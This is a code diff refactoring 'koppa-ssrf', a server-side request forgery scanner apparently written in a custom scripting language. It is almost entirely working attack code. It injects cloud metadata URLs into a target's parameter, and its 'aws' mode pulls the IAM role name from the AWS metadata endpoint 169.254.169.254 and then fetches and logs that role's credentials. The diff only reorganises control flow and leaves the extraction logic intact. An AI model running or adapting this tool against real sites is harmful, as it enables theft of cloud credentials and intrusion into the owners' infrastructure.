@@ -1,5 +1,5 @@
-# koppa-ssrf v1.0 — SSRF detection and cloud metadata extraction
-# Usage: koppa run koppa-ssrf <url> <param> [scan|aws|internal]
+# koppa-ssrf v1.0 — SSRF detection
+# Usage: koppa run koppa-ssrf <url> <param> [scan|aws]
 
 import http, encode, log, report
 
@@ -12,11 +12,13 @@ fn cmd_scan(url, param) {
     log.info("===== SSRF Scan: {url} [{param}] =====")
     let findings = []
     for target in CLOUD_META {
-        let enc  = encode.url_encode(target)
-        let resp = http.get("{url}?{param}={enc}")
-        if resp.status == 200 and resp.body.len > 0 {
+        let enc    = encode.url_encode(target)
+        let resp   = http.get("{url}?{param}={enc}")
+        let status = resp.status
+        let body   = resp.body
+        if status == 200 and body.len > 0 {
             log.success("[+] SSRF -> {target}")
-            log.info(resp.body)
+            log.info(body)
             findings.push(report.finding("SSRF", "Critical", "Reached: {target}"))
         }
     }
@@ -28,24 +30,31 @@ fn cmd_aws(url, param) {
     log.info("===== AWS Metadata Extraction =====")
     let role_url = encode.url_encode("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
     let resp1    = http.get("{url}?{param}={role_url}")
-    let role     = resp1.body.trim()
-    if not role { log.warn("[-] No IAM role found"); return }
-    log.success("[+] IAM Role: {role}")
-    let cred_url = encode.url_encode("http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}")
-    let resp2    = http.get("{url}?{param}={cred_url}")
-    log.success("[+] Credentials:\n{resp2.body}")
+    let role     = str.strip(resp1.body)
+    if not role { log.warn("[-] No IAM role found") }
+    if role {
+        log.success("[+] IAM Role: {role}")
+        let cred_url = encode.url_encode("http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}")
+        let resp2    = http.get("{url}?{param}={cred_url}")
+        log.success("[+] Credentials: {resp2.body}")
+    }
+}
+
+fn run_ssrf(url, param, mode) {
+    if mode == "scan" or not mode { cmd_scan(url, param) }
+    if mode == "aws"  { cmd_aws(url, param) }
+    log.success("SSRF test complete!")
 }
 
 fn main() {
     let url   = __args__[0]
     let param = __args__[1]
     let mode  = __args__[2]
+    log.info("===== KOPPA SSRF Tester v1.0 =====")
+    if url and param {
+        run_ssrf(url, param, mode)
+    }
     if not url or not param {
         log.warn("Usage: koppa run koppa-ssrf <url> <param> [scan|aws]")
-        return
     }
-    log.info("===== KOPPA SSRF Tester v1.0 =====")
-    if not mode or mode == "scan" { cmd_scan(url, param) }
-    if mode == "aws"  { cmd_aws(url, param) }
-    log.success("SSRF test complete!")
 }
